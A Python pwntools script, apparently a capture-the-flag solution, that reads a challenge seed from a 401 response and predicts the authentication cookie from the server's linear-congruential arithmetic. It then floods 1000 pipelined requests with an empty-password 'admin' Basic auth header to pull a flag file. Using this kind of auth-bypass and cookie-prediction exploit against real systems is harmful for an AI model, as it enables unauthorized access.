#!/usr/bin/env python3
from pwn import *
import re
import base64

HOST = 'up.zoolab.org'
PORT = 10933
context.log_level = 'warning'

def calculate_cookie(reqseed_val):
    x2 = reqseed_val * 6364136223846793005 + 1
    x2 &= 0xFFFFFFFFFFFFFFFF # Mask to 64 bits
    x2 >>= 33
    return x2

# Start connection
conn = remote(HOST, PORT)
# Send a preliminary request to trigger 401 and get reqseed
prelim_request_path = "/secret/FLAG.txt"
prelim_request = f"GET {prelim_request_path} HTTP/1.1\r\nHost: {HOST}\r\nConnection: keep-alive\r\n\r\n".encode()
conn.send(prelim_request)
response_prelim_headers = b""
try:
    response_prelim_headers = conn.recvuntil(b"\r\n\r\n", timeout=5)
except PwnlibException as e:
    print(f"[-] Timeout or error receiving preliminary response headers: {e}")
    conn.close()
    exit(1)
# Consume preliminary response body if Content-Length is present
content_len_match = re.search(b"Content-Length: (\\d+)", response_prelim_headers)
if content_len_match:
    body_len = int(content_len_match.group(1))
    if body_len > 0:
        try:
            conn.recv(body_len, timeout=5)
        except PwnlibException as e:
            print(f"[-] Timeout or error receiving preliminary response body: {e}")
            
cookie_match = re.search(b"Set-Cookie: challenge=(\\d+);", response_prelim_headers)
if not cookie_match:
    conn.close()
    exit(1)

reqseed = int(cookie_match.group(1))
target_cookie = calculate_cookie(reqseed)

# Encoded "admin:"
auth_empty_password = base64.b64encode("admin:".encode())

# request format
request_path = "/secret/FLAG.txt"
request_payload = (
    f"GET {request_path} HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Authorization: Basic {auth_empty_password.decode()}\r\n"
    f"Cookie: response={target_cookie}\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
)
request = request_payload.encode()

# keep sending request
for i in range(1000):
    conn.send(request)

# get http response
all_responses_data = b""
try:
    all_responses_data = conn.recvall(timeout=2)
except PwnlibException as e:
    print(f"[*] PwnlibException during recvall: {e}. Checking received data anyway.")

if not all_responses_data:
    print("[-] No data received")
    conn.close()
    exit(1)

final_output_str = all_responses_data.decode(errors='ignore')

flag_pattern = r"FLAG\{[a-zA-Z0-9_!@#$%^&*()-+=.,:;?~]+\}"
flag_match = re.search(flag_pattern, final_output_str)
if flag_match:
    print(f"{flag_match.group(0)}")
else:
    print(f"Fail to find flag")
conn.close()
